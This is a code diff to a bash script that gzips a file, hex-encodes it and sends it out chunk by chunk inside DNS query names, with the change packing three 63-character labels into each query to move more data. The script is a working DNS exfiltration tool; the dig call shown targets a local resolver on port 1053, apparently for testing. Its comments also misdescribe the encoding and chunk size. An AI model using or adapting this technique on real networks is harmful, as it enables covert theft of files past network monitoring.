@@ -16,7 +16,7 @@ function main() {
     tmp_file=$(mktemp)
 
     # Compress the file, encode it to Base64, and then split into 32-character chunks
-    cat "$FILE_PATH" | gzip | xxd -p | fold -w63 > $tmp_file
+    cat "$FILE_PATH" | gzip | xxd -p -c 0 | fold -w 189 > $tmp_file
     LINES=$(wc -l < $tmp_file | awk '{$1=$1};1')
 
     # Initialize chunk counter
@@ -29,8 +29,29 @@ function main() {
     while IFS= read -r line; do
         echo "Part $COUNTER/$LINES"
 
-        # Construct the DNS query using the chunk and counter
-        QUERY="${line}.${COUNTER}.${SESSION_ID}.${DOMAIN_NAME}"
+        chunk1=$(echo $line | cut -c1-63)
+        chunk2=$(echo $line | cut -c64-126)
+        chunk3=$(echo $line | cut -c127-189)
+
+        QUERY="${COUNTER}.${SESSION_ID}.${DOMAIN_NAME}"
+
+        if [ ! -z "$chunk3" ]; then
+          QUERY="${chunk3}.${QUERY}"
+        else
+          QUERY="_.${QUERY}"
+        fi
+
+        if [ ! -z "$chunk2" ]; then
+          QUERY="${chunk2}.${QUERY}"
+        else
+          QUERY="_.${QUERY}"
+        fi
+
+        if [ ! -z "$chunk1" ]; then
+          QUERY="${chunk1}.${QUERY}"
+        else
+          QUERY="_.${QUERY}"
+        fi
 
         response=$(dig $QUERY +short @127.0.0.1 -p 1053) &
 
